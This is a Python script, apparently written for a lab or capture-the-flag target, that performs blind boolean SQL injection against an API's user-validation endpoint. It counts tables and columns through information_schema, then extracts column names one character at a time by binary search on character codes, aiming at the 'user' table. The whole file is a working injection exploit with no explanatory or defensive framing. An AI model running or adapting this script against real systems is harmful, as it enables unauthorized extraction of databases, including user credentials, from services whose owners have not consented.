import requests
from urllib.parse import quote

URL = "http://10.10.110.20/api/v1/user/validate/asd@asd"

def get(payload):
    r = requests.get(URL + quote(payload))
    print(r.status_code, len(r.text), repr(r.text[:200]))
    return r

def get_table_count():
    matched = get("' or (select count(1) from information_schema.tables where table_schema=database()) not like 0-- -")
    for i in range(0, 30):
        r = get(f"' or (select count(1) from information_schema.tables where table_schema=database()) like {i}-- -")
        if r.text == matched.text:
            return i
    raise Exception("couldn't find table count")

print("Number of tables:", get_table_count())

def get_column_count(table):
    matched = get(f"' or (select count(1) from information_schema.columns where table_name like '{table}') not like 0-- -")
    for i in range(0, 30):
        r = get(f"' or (select count(1) from information_schema.columns where table_name like '{table}') like {i}-- -")
        if r.text == matched.text:
            return i
    raise Exception("couldn't find column count")


def column_name_char(table, offset, idx):
    start = 32
    end = 126

    matched = get(f"' or (select ord(substring(column_name from 0 for 0)) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) like 0-- -")
    unmatched = get(f"' or (select ord(substring(column_name from 0 for 0)) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) not like 0-- -")

    if matched.text == unmatched.text:
        raise Exception("Cannot perform substring on column_name")

    while start != (end - 1):
        halfway = int((end - start) / 2)
        guess = start + halfway
        r = get(f"' or (select ord(substring(column_name from {offset} for 1)) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) between {start} and {guess}-- -")
        if r.text == matched.text:
            end = guess
        else:
            start = guess

    r = get(f"' or (select ord(substring(column_name from {offset} for 1)) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) like {start}-- -")
    return chr(start) if r.text == matched.text else chr(end)


def dump_column_names(table):
    count = get_column_count(table)
    for idx in range(count):
        matched = get(f"' or (select length(column_name) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) not like 0-- -")
        length = 0
        for guess in range(1, 64):
            r = get(f"' or (select length(column_name) from information_schema.columns where table_name like '{table}' limit 1 offset {idx}) like {guess}-- -")
            if r.text == matched.text:
                length = guess
                break
        name = "".join(column_name_char(table, x + 1, idx) for x in range(length))
        print(f"[{idx}] {name}")

dump_column_names("user")
